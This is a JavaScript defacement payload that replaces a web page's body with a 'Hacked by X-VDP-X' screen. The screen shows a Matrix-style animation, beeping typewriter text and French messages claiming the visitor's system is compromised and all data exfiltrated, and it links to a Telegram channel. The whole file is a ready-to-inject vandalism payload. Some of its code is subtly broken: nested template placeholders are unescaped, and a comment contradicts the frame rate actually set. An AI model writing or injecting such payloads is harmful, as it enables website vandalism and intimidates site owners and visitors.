document.body.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hacked by X-VDP-X</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  html, body {
    width: 100%;
    height: 100%;
    background: black;
    overflow: hidden;
    font-family: 'Arial', sans-serif;
    color: red;
    text-align: center;
    user-select: none;
    cursor: crosshair;
  }
  canvas#matrix {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 1;
    pointer-events: none;
  }
  .content {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100%;
    padding: 20px;
  }
  .logo-container {
    margin-bottom: 20px;
    perspective: 800px;
    transition: transform 0.2s ease-out;
  }
  .logo-container img {
    width: 150px;
    height: 150px;
    border-radius: 50%;
    box-shadow: 0 0 20px red, 0 0 40px red, 0 0 60px darkred;
    transition: transform 0.3s, box-shadow 0.3s;
    display: block;
    margin: auto;
  }
  .logo-container img:hover {
    transform: scale(1.1);
    box-shadow: 0 0 30px red, 0 0 50px darkred;
  }
  h1, h2, h3 {
    margin: 15px 0;
    text-shadow: 0 0 10px red, 0 0 20px red;
  }
  h2 { font-size: 20px; }
  h3 {
    font-size: 16px;
    max-width: 90%;
    margin: 0 auto;
  }
  .warning {
    margin-top: 20px;
    font-weight: bold;
    font-size: 16px;
    color: red;
    text-shadow:
      0 0 10px red,
      0 0 20px darkred;
    animation: glitch 2.5s infinite;
    position: relative;
  }
  .warning::before, .warning::after {
    content: attr(data-text);
    position: absolute;
    left: 0; top: 0;
    width: 100%; height: 100%;
    opacity: 0.8;
    clip-path: polygon(0 45%, 100% 50%, 100% 55%, 0 50%);
  }
  .warning::before {
    animation: glitchTop 2.5s infinite;
    color: #ff0000;
    left: 2px;
    text-shadow: -2px 0 red;
  }
  .warning::after {
    animation: glitchBottom 2.5s infinite;
    color: #ff4444;
    left: -2px;
    text-shadow: -1px 0 darkred;
  }
  .btn {
    margin-top: 25px;
    padding: 12px 40px;
    background: #00bfff;
    color: white;
    font-weight: 700;
    border: none;
    border-radius: 30px;
    text-transform: uppercase;
    cursor: pointer;
    box-shadow: 0 0 10px #00bfff;
    font-size: 16px;
    user-select: none;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    letter-spacing: 2px;
    animation: pulseNeon 3s ease-in-out infinite;
  }
  .btn:hover {
    transform: scale(1.2);
    box-shadow:
      0 0 10px #00d4ff,
      0 0 20px #00d4ff,
      0 0 30px #00d4ff,
      0 0 40px #00d4ff;
  }
  .dedicace {
    margin-top: 20px;
    font-size: 16px;
    font-style: italic;
    text-shadow: 0 0 10px red;
  }

  @keyframes glitch {
    0%, 100% { text-shadow: 0 0 10px red, 0 0 20px darkred; }
    20% { text-shadow: 2px 0 10px red, -2px 0 20px darkred; }
    40% { text-shadow: -2px 0 10px red, 2px 0 20px darkred; }
    60% { text-shadow: 2px 2px 10px red, -2px -2px 20px darkred; }
    80% { text-shadow: -2px -2px 10px red, 2px 2px 20px darkred; }
  }
  @keyframes glitchTop {
    0%, 100% { clip-path: polygon(0 45%, 100% 50%, 100% 55%, 0 50%); }
    50% { clip-path: polygon(0 40%, 100% 45%, 100% 50%, 0 45%); }
  }
  @keyframes glitchBottom {
    0%, 100% { clip-path: polygon(0 55%, 100% 60%, 100% 65%, 0 60%); }
    50% { clip-path: polygon(0 60%, 100% 65%, 100% 70%, 0 65%); }
  }
  @keyframes pulseNeon {
    0%, 100% {
      box-shadow: 0 0 10px #00bfff, 0 0 20px #00bfff;
    }
    50% {
      box-shadow:
        0 0 20px #00d4ff,
        0 0 40px #00d4ff,
        0 0 60px #00d4ff;
    }
  }
  @media (max-width: 600px) {
    .logo-container img { width: 100px; height: 100px; }
    h1, h2, h3, .warning, .dedicace { font-size: 14px; }
    .btn { padding: 10px 30px; font-size: 14px; }
  }
</style>
</head>
<body>
  <canvas id="matrix"></canvas>

  <div class="content">
    <div class="logo-container" onclick="window.location.href='https://t.me/xvdpx6'">
      <img src="https://i.postimg.cc/q79gXyTp/image-2.webp" alt="Logo X-VDP-X" />
    </div>

    <h1 id="typewriter"></h1>
    <h2># Hack Word # Hacked # X-VDP-X</h2>
    <h3>
      VOTRE SYSTÈME A ÉTÉ COMPROMIS. NOUS AVONS TOUT. NOUS AVONS INFILTRÉ CHAQUE ÉTAGE DE VOTRE RÉSEAU. VOS DONNÉES SONT À NOUS. TOUT A ÉTÉ EXFILTRÉ. MAIS VOUS N'AVEZ AUCUNE CHANCE DE NOUS ARRÊTER. NOUS SOMMES DÉJÀ LÀ.
    </h3>

    <p class="warning" data-text="">
      VOTRE PEUR NOUS ALIMENTE, VOTRE SYSTÈME NOUS APPARTIENT !
    </p>

    <button class="btn" onclick="window.location.href='https://t.me/xvdpx6'">
      TELEGRAM
    </button>
  </div>

<script>
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');

  let width, height;
  function resize() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
  }
  resize();
  window.addEventListener('resize', () => {
    resize();
    drops = new Array(columns).fill(1);
  });

  const katakana = "アァイィウヴエェオカガキギクグケゲコゴサザシジスズセゼソゾタダチッヂヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモヤユヨラリルレロワヲン";
  const chars = katakana.split("");
  const fontSize = 18;
  const columns = Math.floor(width / fontSize);
  let drops = new Array(columns).fill(1);

  // vitesse plus lente ici (intervalle plus long entre frames)
  let lastTime = 0;
  const fps = 60; // Vitesse abaissée à 15 frames par seconde (moins rapide)
  const interval = 1000 / fps;

  function drawMatrix(time = 0) {
    if (time - lastTime > interval) {
      ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
      ctx.fillRect(0, 0, width, height);

      for (let i = 0; i < drops.length; i++) {
        let blue = 191 + Math.floor(64 * Math.sin(time/500 + i));
        ctx.fillStyle = \`rgb(0, ${blue}, 255)\`;
        ctx.font = fontSize + "px monospace";

        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > height || Math.random() > 0.98) {
          drops[i] = 0;
        }
        drops[i]++;
      }
      lastTime = time;
    }
    requestAnimationFrame(drawMatrix);
  }
  drawMatrix();

  // Logo rotation
  const logo = document.querySelector('.logo-container');
  window.addEventListener('mousemove', e => {
    const x = e.clientX / window.innerWidth - 0.5;
    const y = e.clientY / window.innerHeight - 0.5;
    const rotateX = y * 15;
    const rotateY = x * 15;
    logo.style.transform = \`rotateX(${-rotateX}deg) rotateY(${rotateY}deg)\`;
  });

  // Typewriter effect
  const text = "Hacked by X-VDP-X";
  const target = document.getElementById('typewriter');
  let index = 0;

  function playBleep() {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioCtx.createOscillator();
    const gainNode = audioCtx.createGain();

    oscillator.type = 'square';
    oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
    gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);

    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);

    oscillator.start();
    oscillator.stop(audioCtx.currentTime + 0.05);
  }

  function typeWriter() {
    if (index < text.length) {
      target.textContent += text.charAt(index);
      playBleep();
      index++;
      setTimeout(typeWriter, 120);
    }
  }
  typeWriter();
</script>
</body>
</html>

`;

